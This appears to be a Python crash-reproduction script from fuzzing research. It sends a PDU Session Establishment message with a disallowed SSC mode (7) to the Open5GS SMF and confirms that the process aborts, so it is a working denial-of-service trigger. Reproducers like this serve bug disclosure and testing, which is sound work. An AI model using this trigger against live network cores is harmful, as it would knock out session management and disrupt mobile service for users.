#!/usr/bin/env python3
"""Reproduce Open5GS SMF abort on disallowed 5GSM SSC mode.

Sends a valid PDU Session Establishment (SSC=1), then the same N1 with SSC=7.
Expect: first HTTP 201; second curl HTTP/2 RST and open5gs-smfd gone.

This kills SMF. Restart afterwards, e.g.:
  /corefuzzer_deps/open5gs/build/src/smf/open5gs-smfd \\
    -c /corefuzzer_deps/open5gs/build/configs/sample.yaml
"""
from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
if Path("/corefuzzer").is_dir():
    ROOT = Path("/corefuzzer")
else:
    ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT))

from objects.iface_probes import live_pids, sbi_create_sm_context  # noqa: E402

SSC1 = (HERE / "poc" / "n1_pdu_est_ssc1.bin").read_bytes()
SSC7 = (HERE / "poc" / "n1_pdu_est_ssc7.bin").read_bytes()


def main() -> int:
    before = live_pids().get("open5gs-smfd") or []
    print("smf_before", before)
    if not before:
        print("SMF is not running; start open5gs-smfd first", file=sys.stderr)
        return 2

    r0 = sbi_create_sm_context(SSC1)
    print("valid_ssc1", r0.get("status"), r0.get("location"), (r0.get("err") or "")[:120])
    print("smf_after_valid", live_pids().get("open5gs-smfd"))

    r1 = sbi_create_sm_context(SSC7)
    print("crash_ssc7", r1.get("status"), (r1.get("err") or "")[:200], "loc", r1.get("location"))
    after = live_pids().get("open5gs-smfd") or []
    print("smf_after_ssc7", after)

    crashed = (not after) or (set(after).isdisjoint(set(before)) and r1.get("status") in (0, None))
    if not after:
        print("RESULT confirmed: SMF process gone (assert abort)")
        return 0
    if crashed:
        print("RESULT likely crash (PID set changed)")
        return 0
    print("RESULT NOT reproduced (SMF still alive)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
